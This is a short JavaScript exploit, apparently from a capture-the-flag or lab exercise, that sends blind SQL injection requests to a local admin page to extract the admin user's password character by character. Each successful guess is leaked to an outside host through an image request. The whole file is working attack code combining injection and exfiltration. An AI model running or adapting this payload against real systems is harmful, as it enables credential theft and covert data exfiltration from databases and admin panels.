

function go(i, j) {
    $.ajax({
        type: 'get',
        url: "http://localhost/admin/read.php?idx_token=35a423a8ac88191dbc5f5875858992aaf6269985%27%20%26%26%20(ascii(substr((select user_pw from users where user_id='admin'),"+j+",1)))="+i+"%23",
        // url: 'http://localhost/admin/read.php?idx_token=2c18ffbc0fa5f6a712ab2900f27207debea28995',
            async: false,
        success: function(data) {
            var x = new Image();
            x.src='http://junan.io/x_'+i;
            console.log(data);
            },
        error: function(err) {
            // var x = new Image();
            // x.src='http://localhost/x_error';
            }
    });
}


for (j=1; j<2; j++) {
    for (i=32; i<127; i++) {
        go(i, j);
    }
}